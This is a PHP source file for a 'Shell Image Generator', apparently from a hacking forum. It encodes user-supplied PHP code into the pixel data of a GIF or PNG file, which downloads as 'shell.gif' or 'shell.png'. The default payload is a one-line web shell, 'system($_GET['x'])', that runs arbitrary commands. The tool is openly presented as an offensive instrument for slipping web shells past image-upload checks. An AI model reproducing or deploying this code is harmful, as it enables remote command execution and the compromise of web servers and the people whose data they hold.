<?php

/**
 * @author BlueBoyz
 * @copyright 2013 ExploreCrew.Org
 * @fixed Jei.Xcrew, and you..
 * @filesource http://forum.explorecrew.org/index.php?action=forum
 * 
 * We hate Ripper!! Please don't remove or change original author name of posted article/code
 * fixed it add your nick
 */

/**
 * Any consequences in views of the use of scripts, techniques, codes, tutorials, 
 * and everything imaginable on this website are purely the responsibility of the user,
 * NOT ExploreCrew or OTHER FORUM of posted this article/code. 
 * If you agree about this, continue reading. 
 * If you do not agree, please leave.
**/

    session_start();

    if(isset($_POST['scripts']))
    {
        if((strlen($_POST['scripts']) > 20) && (strlen($_POST['scripts']) < 6000))
        {
            @$_SESSION["scripts"] = base64_encode(@$_POST['scripts']);
            @$_SESSION["image"] = $_POST['image'];
            header("Location: ?set");
        }else{
              die('
    <script type="text/javascript"> 
        alert("minlength:20 and maxlength:6000")
        window.location = "?";
    </script>'
    );
        }
    }
    
    if(isset($_POST['reset']))
    {
        $_SESSION["scripts"] = base64_encode("<?php\r\n#min:20 max:6000 \r\nsystem(\$_GET['x']) ;\r\n?>");
        $_SESSION["image"] = "jpg";
        header("Location: ?null");
    }

    /**
     if((empty($_COOKIE['scripts'])) || ($_COOKIE['scripts'] == '') || ($_COOKIE['scripts'] == null))
    {
        $_SESSION["scripts"] = base64_encode("<?php\r\n#min:20 max:6000 \r\nsystem(\$_GET['x']) ;\r\n?>");
        $_SESSION["image"] = "jpg";
        header("Location: ?null");
    }
    */
    $string = @base64_decode(@$_SESSION['scripts']);
    $imageExt = trim(strtolower(@$_SESSION['image']));

    if(isset($_GET['preview']))
    {
        $string = "\r\n".$string."\r\n<!-- \r\n\r\nShell Image Generator  by Forum.ExploreCrew.Org\r\n\r\n";
        ;
        $px = ((int)(strlen($string) / 3));
        $arr_string = str_split($string,$px);
        $im = @imagecreate(($px),($px)) or die("Cannot Initialize new GD image stream");
        $arrString = array();
        for($h = 0; $h < ($px); $h++)
        {
            $arrString = @$arr_string[$h];
            $current = 0;
            for($w = 0; $w < ($px); $w++)
            {
                if((@$arrString[$current + 0] != '') && (@$arrString[$current + 1] != '') && (@
                    $arrString[$current + 2] != ''))
                {
                    $color_r = dechex(ord(@$arrString[$current + 0]));
                    $color_g = dechex(ord(@$arrString[$current + 1]));
                    $color_b = dechex(ord(@$arrString[$current + 2]));
                    $current = $current + 3;

                    $color = @imagecolorallocate($im,"0x$color_r","0x$color_g","0x$color_b");
                    imagesetpixel($im,$w,$h,$color);
                }
            }
        }

        //header("Content-Type: image/png");
        switch(trim($imageExt))
        {
            case "gif":
                imagegif($im,null);
                break;
            case "png":
                imagepng($im,null);
                break;
        }

        if(isset($_GET['download']))
        {
            header('Content-Disposition: attachment; filename="shell.'.$imageExt.'"');
        }

        imagedestroy($im);
        die();
    }
    $download = sha1(rand(0,999)).'.'.$imageExt;
    echo '<!DOCTYPE HTML>';
    echo '<html>';
    echo '<head>';
    echo '<meta http-equiv="content-type" content="text/html" />';
    echo '<meta name="author" content="ExploreCrew UnderGround" />';
    echo '<title>SHELL IMAGE GENERATOR</title>';
    echo '<style type="text/css">';
    echo 'article{color:#aaa;margin: auto; position: relative;width:80%; border: 1px solid #eee;padding: 5px;border-radius: 3px;-o-border-radius: 3px;-webkit-border-radius: 3px;-moz-border-radius: 3px;}';
    echo 'div textarea,div select{ float: right;width:60%; font-size:1.0em;border: 1px solid #eee;border-radius: 3px;-o-border-radius: 3px;-webkit-border-radius: 3px;-moz-border-radius: 3px; margin:3px;}';
    echo 'div input{ text-shadow: #333 0px 1px;color:#aaa; background: -moz-linear-gradient(#f8f8f8, #9d9e9d);background: -webkit-linear-gradient(#f8f8f8, #9d9e9d);background: -o-linear-gradient(#f8f8f8, #9d9e9d);float: right;width:25%; font-size:1.0em; box-shadow: 0px 2px 2px;-moz-box-shadow: 0px 2px 2px;-o-box-shadow: 0px 2px 2px;-webkit-box-shadow: 0px 2px 2px; border: 1px solid #ddd;border-radius: 3px;-o-border-radius: 3px;-webkit-border-radius: 3px;-moz-border-radius: 3px; margin:3px;}';
    echo 'div input:hover{ text-shadow: #333 0px 1px;color:#000; background: -moz-linear-gradient(#f8f8f8, #9d9e9d);background: -webkit-linear-gradient(#f8f8f8, #9d9e9d);background: -o-linear-gradient(#f8f8f8, #9d9e9d);float: right;width:25%; font-size:1.0em; box-shadow: 0px 2px 2px;-moz-box-shadow: 0px 2px 2px;-o-box-shadow: 0px 2px 2px;-webkit-box-shadow: 0px 2px 2px; border: 1px solid #ddd;border-radius: 3px;-o-border-radius: 3px;-webkit-border-radius: 3px;-moz-border-radius: 3px; margin:3px;}';
    echo 'div label{ color:#aaa;float: left;display:block; height:20px; font-size:1.0em;width:auto;}';
    echo 'fieldset { background-color: #f8f8f8;width:auto;height:auto;border: 1px solid #eee;border-radius: 3px;-o-border-radius: 3px;-webkit-border-radius: 3px;-moz-border-radius: 3px;}';
    echo 'textarea {height:125px;}';
    echo 'legend {color:#333;text-shadow: #888 0px 1px;}';
    echo 'form div {height:20px; clear:both; margin-bottom:6px; padding:5px 0px;}';
    echo 'h3,h5 {text-align:center}';    
    echo '</style>';
    echo '</head>';
    echo '<body>';
    echo '<article>';
    echo '<h3>..:: SHELL IMAGE GENERATOR ::..</h3>';
    echo '<h5>Free Tool by <a href="http://forum.explorecrew.org">Viva ExploreCrew</a></h5>'; 
    echo '<form method="post" action="" enctype="multipart/form-data">';
    echo '<fieldset>';
    echo '<legend>SHELL</legend>';
    echo '<div><label for="scripts">Yours Scripts</label><textarea name="scripts" id="scripts" maxlength="6000">'.
        htmlentities($string).'</textarea></div>';
    echo '<div>';
    echo '<label for="image">Mime Type</label>';
    echo '<select size="1" name="image">';
    echo '<option value="gif">image/gif</option>';
    echo '<option value="png">image/png</option>';
    echo '</select>';
    echo '</div>';
    echo '<div><input type="submit" value="Reset" name="reset" id="generate"/><input type="submit" value="Generate" name="generate" id="generate"/></div>';
    echo '</fieldset>';
    echo '</form>';
    echo '<fieldset>';
    echo '<legend>YOUR SHELL IMAGE</legend>';
    echo '<div><img src="?preview='.$download.
        '"  width="275px" height="275px" /></div>';
    echo '<div><a href="?preview='.$download.'&download">Download</a></div>';
    echo '</fieldset>';
    echo '<small>Free Tool by <a href="http://forum.explorecrew.org">Viva ExploreCrew, Coded by BlueBoyz, Fixed Jei.Free.</a><small>';    
    echo '</article>';

    echo '</body>';
    echo '</html>';
?>